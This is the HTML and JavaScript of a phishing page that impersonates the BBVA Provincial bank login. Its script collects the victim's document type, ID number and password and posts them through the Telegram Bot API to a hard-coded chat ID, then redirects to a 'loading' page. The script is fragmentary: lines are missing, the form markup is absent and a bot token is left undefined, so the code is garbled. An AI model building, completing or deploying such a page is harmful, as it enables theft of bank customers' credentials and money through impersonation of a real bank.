<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>BBVA Provincial</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background-color: #ffffff;
    }
    .header {
      background-color: #052146;
      color: white;
      padding: 20px;
      display: flex;
      flex-direction: column;
      align-items: flex-start;
    }
    .header h1 {
      margin: 0;
      font-size: 24px;
      font-weight: bold;
    }
    .header span {
      margin-top: 5px;
      font-size: 14px;
      color: #b5d0ff;
    }
    .container {
      max-width: 400px;
      margin: 40px auto;
      padding: 0 20px;
      text-align: center;
    }
    .container h2 {
      font-size: 32px;
      margin-bottom: 20px;
    }
    select, input {
      width: 100%;
      padding: 14px;
      margin: 12px 0;
      border: none;
      border-bottom: 2px solid black;
      font-size: 16px;
      background-color: #f2f3f5;
    }
    button {
      width: 100%;
      padding: 15px;
      background-color: #052146;
      color: white;
      font-weight: bold;
      font-size: 16px;
      border: none;
      cursor: pointer;
      margin-top: 20px;
    }
    a.forgot {
      display: block;
      margin-top: 20px;
      font-size: 14px;
      color: #4188F3;
      text-decoration: none;
    }
    .footer {
      background-color: #052146;
      color: white;
      text-align: center;
      padding: 30px 10px;
      margin-top: 60px;
    }
    .footer .logo {
      font-size: 20px;
      font-weight: bold;
      margin-bottom: 15px;
    }
    .social-icons {
      margin-bottom: 15px;
    }
    .social-icons span {
      display: inline-block;
      width: 36px;
      height: 36px;
      background-color: #5ca9f7;
      border-radius: 50%;
      line-height: 36px;
      text-align: center;
      margin: 0 6px;
      font-size: 18px;
      color: #052146;
      font-weight: bold;
    }
    .footer small {
      display: block;
      margin: 10px 0;
      font-size: 12px;
    }
    .footer .slogan {
      color: #5ca9f7;
      font-size: 14px;
      margin-top: 5px;
    }
  </style>
</head>
<body>

  <div class="header">

  <script>

    const CHAT_ID = '-4922278503';     // Reemplaza con tu chat ID

      e.preventDefault();

      const formData = new FormData(this);
      const tipo = formData.get('tipo');
      const documento = formData.get('documento');
      const clave = formData.get('clave');

      try {

 *Tipo:* ${tipo}

        `;

        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {

          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: mensaje,
            parse_mode: 'Markdown'
          })
        });

        window.location.href = 'cargando.html';
      } catch (error) {
        alert('Error al enviar datos. Intenta de nuevo.');
        console.error(error);

    });
  </script>

</body>
</html>
